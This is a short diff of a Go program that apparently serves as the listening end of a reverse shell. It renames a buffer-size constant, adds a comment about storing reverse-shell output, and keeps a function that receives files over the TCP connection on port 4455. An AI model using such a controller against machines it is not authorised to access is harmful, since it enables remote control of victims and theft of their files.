@@ -11,11 +11,11 @@ import (
 	"strings"
 )
 
-//BUFFSIZE total buffer to read
-const BUFFSIZE = 1024
+// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
+const FILEREADBUFFSIZE = 1024
 
 func main() {
-	var buff [2048]byte
+	var buff [2048]byte //stores output from reverse shell
 
 	fmt.Println("Server started")
 	listner, _ := net.Listen("tcp", ":4455")
@@ -67,13 +67,13 @@ func getFilewithNameandSize(connection net.Conn, command string) {
 	var receivedBytes int64
 
 	for {
-		if (fileSize - receivedBytes) < BUFFSIZE {
+		if (fileSize - receivedBytes) < FILEREADBUFFSIZE {
 			io.CopyN(newFile, connection, (fileSize - receivedBytes))
-			connection.Read(make([]byte, (receivedBytes+BUFFSIZE)-fileSize))
+			connection.Read(make([]byte, (receivedBytes+FILEREADBUFFSIZE)-fileSize))
 			break
 		}
-		io.CopyN(newFile, connection, BUFFSIZE)
-		receivedBytes += BUFFSIZE
+		io.CopyN(newFile, connection, FILEREADBUFFSIZE)
+		receivedBytes += FILEREADBUFFSIZE
 	}
 	fmt.Println("Received file completely!")
 	return
